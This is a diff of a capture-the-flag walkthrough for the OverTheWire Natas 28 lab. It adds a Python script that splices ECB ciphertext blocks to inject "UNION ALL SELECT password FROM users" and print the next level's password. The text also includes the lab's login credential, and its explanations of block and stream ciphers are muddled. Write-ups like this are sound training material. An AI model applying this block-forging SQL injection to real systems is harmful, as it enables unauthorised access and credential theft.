@@ -1459,83 +1459,136 @@ Step 9: Then you will get the password
 + Domain : http://natas28.natas.labs.overthewire.org
 
 ## Explanation
+Step 1:  Go to Firefox Browser, Then Connect to natas28.natas.labs.overthewire.org, Then login with username and password
 
-search every time with same charecters or words or different words or charecters it shows diffrent jockes , but length of 3 is permitted (3 jocks), Every time it shows diffrent jockes 
+Step 2: You will see the page like this
 
-if change that means delete perticular query, it will show like this
+![image](./images-1/image-28.png)
 
-generally PKCS #7 USES  a Block cipher , then brutefoece attack to find multiple query
+Step 3: It will search every time with same charecters or words or different words or charecters it shows diffrent jockes , but length of 3 is permitted (3 jocks), Every time it shows diffrent jockes 
+
+![image](./images-1/image-28-1.png)
+
+![image](./images-1/image-28-2.png)
+
+Step 4: If change that means delete perticular query, it will show like this
+
+![image](./images-1/image-28-3.png)
+
+![image](./images-1/image-28-4.png)
+
+Step 5: generally PKCS #7 USES  a Block cipher , then brutefoece attack to find multiple query
 
 block cipher is proper way encode the data , but if you input same data multipul time the encoding is similer 
 
-instead of stream cipher 
-, stream cipher, it chages some incryption , if you input same data mulyipile times , the number pf times you input the data what was before the data changes how the data getting incrypted  
+    instead of stream cipher 
+    stream cipher, it chages some incryption , if you input same data mulyipile times , the number pf times you input the data what was before the data changes how the data getting incrypted  
 
-its padding like 
-xxxxxxxxxxxx
-xxxxxxxxxxxx
-xxxx
-       xxxxx
-xxxxxxxxxxxx
-xxxxxxxxxxxx
+Step 6: It will structuted the padding like 
+               
+    xxxxxxxxxxxx
+    xxxxxxxxxxxx
+    xxxx
+           xxxxx
+    xxxxxxxxxxxx
+    xxxxxxxxxxxx
 
-we are trying to use sql injectiopn with backtic (`)   
+    we are trying to use sql injectiopn   
 
-union mergers any two table , and merges all present in the database
+    union mergers any two table , and merges all present in the database
 
-find the num of bocks in our sql injection
+    find the num of bocks in our sql injection
 
-
-
-
-
+Step 7:  So, we will Write a code like this, In nano editor, Then save the file, Then Run the file by using python filename. Whole process in kali Linux. Because of it has librabraries, we can't Run it online platform.
 
 
+    import requests
+    import urllib.parse
+    import base64
 
+    url = "http://natas28.natas.labs.overthewire.org/index.php?lang="
+    search_url = "http://natas28.natas.labs.overthewire.org/search.php"
 
+    # Create session with authentication
+    s = requests.Session()
+    s.auth = ("natas28", "1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj")
 
+    # --------------------------------------------------
+    # Step 1: Generate baseline for header and footer
+    # --------------------------------------------------
 
-
-
-
-
-import requests
-import urllib
-import base64
-
-url = 'http://natas28.natas.labs.overthewire.org/index.php?lang='
-s = requests.Session()
-s.auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')
-
-sample = 'A' 
-
-while len(sample) < 32:
     data = {
-        'query':sample
+         "query": 10 * " "
     }
+
     r = s.post(url, data=data)
-    cipher = r.url.split('query=')[1]
-    cipher = urllib.parse.unquote(cipher)
-    cipher = base64.b64decode(cipher.encode('utf-8'))
-    cipher = hex(int.from_bytes(cipher, byteorder='big'))[2:]
-    print("[*] %d chars.\t|\n" % (len(sample)))
-    
-    for i in range(0, len(cipher), 32):
-    print(cipher[i:i+32])
-    sample += 'A'+
+
+    baseline = urllib.parse.unquote(r.url.split("=")[1])
+    baseline = base64.b64decode(baseline.encode("utf-8"))
+
+    header = baseline[:48]
+    footer = baseline[48:]
+
+    #  --------------------------------------------------
+    # Step 2: Generate ciphertext for SQL injection
+    # --------------------------------------------------
+
+    sqli = 9 * " " + "' UNION ALL SELECT password FROM users;#"
+
+    data = {
+           "query": sqli
+    }
+
+    r = s.post(url, data=data)
+
+    exploit = urllib.parse.unquote(r.url.split("=")[1])
+    exploit = base64.b64decode(exploit.encode("utf-8"))
+
+    # --------------------------------------------------
+    # Step 3: Calculate number of blocks
+    # --------------------------------------------------
+
+    nblocks = len(sqli) - 10
+    while nblocks % 16 != 0:
+        nblocks += 1
+
+    nblocks = nblocks // 16
+
+    # --------------------------------------------------
+    # Step 4: Forge final ciphertext
+    # --------------------------------------------------
+
+    final = header + exploit[48:(48 + 16 * (1 + nblocks))] + footer
+    final_ciphertext = base64.b64encode(final).decode()
+
+    # --------------------------------------------------
+    # Step 5: Send forged request
+    # --------------------------------------------------
+
+    resp = s.get(search_url, params={"query": final_ciphertext})
+
+    print(resp.text)
+
+
+Step 8: After Run the code, we will get the password for Natas29
+
+![image](./images-1/image-28-5.png)
 
 
 
 
-import requests
-import urllib
-import base64
-
-url = 'http://natas28.natas.labs.overthewire.org/index.php?lang='
-s = requests.Session()
-s.auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')
 
 
-data = {
-    'query': 10 * ' '
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
